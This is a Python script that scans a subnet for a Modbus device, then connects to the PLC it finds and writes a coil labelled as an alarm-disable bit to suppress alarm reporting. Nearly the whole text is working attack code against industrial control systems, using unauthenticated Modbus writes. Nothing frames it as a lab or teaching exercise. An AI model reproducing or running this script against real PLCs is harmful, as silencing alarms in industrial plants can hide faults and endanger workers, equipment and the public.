import socket
from time import sleep
from pyModbusTCP.client import ModbusClient

# Function to discover PLC's IP address (if not known)
def discover_plc_ip(subnet="192.168.9.0/24"):
    from ipaddress import ip_network
    import scapy.all as scapy

    print("Scanning for PLC on subnet...")
    arp_request = scapy.ARP(pdst=subnet)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    for element in answered_list:
        ip = element[1].psrc
        try:
            # Attempt to connect to the PLC's Modbus port (502)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((ip, 502))
                print(f"Found PLC at IP: {ip}")
                return ip
        except:
            continue
    print("PLC not found on the subnet.")
    return None

# Function to suppress alarms by modifying relevant PLC memory
def suppress_alarms(plc_ip):
    try:
        # Connect to the PLC via Modbus TCP
        plc = ModbusClient(host=plc_ip, port=502, auto_open=True)
        if not plc.is_open():
            print("Failed to connect to PLC.")
            return False

        # Modify alarm-related memory bits or registers
        # Example: Disable alarm reporting by setting a specific memory bit
        # (Replace %Mx with the actual memory address for alarm settings)
        alarm_disable_bit = 1  # Example: %M3 (change this to the actual address)
        plc.write_single_coil(alarm_disable_bit, True)

        # Verify the change
        result = plc.read_coils(alarm_disable_bit, 1)
        if result and result[0]:
            print(f"Alarm suppression successful. Bit {alarm_disable_bit} set to TRUE.")
            return True
        else:
            print("Failed to modify alarm settings.")
            return False

    except Exception as e:
        print(f"Error: {e}")
        return False

# Main script
if __name__ == "__main__":
    # If the PLC's IP is not known, discover it
    plc_ip = "192.168.9.24"  # Replace with None to discover the IP
    if not plc_ip:
        plc_ip = discover_plc_ip()
        if not plc_ip:
            exit("PLC IP address not found.")

    # Suppress alarms
    if suppress_alarms(plc_ip):
        print("Alarm suppression completed.")
    else:
        print("Failed to suppress alarms.")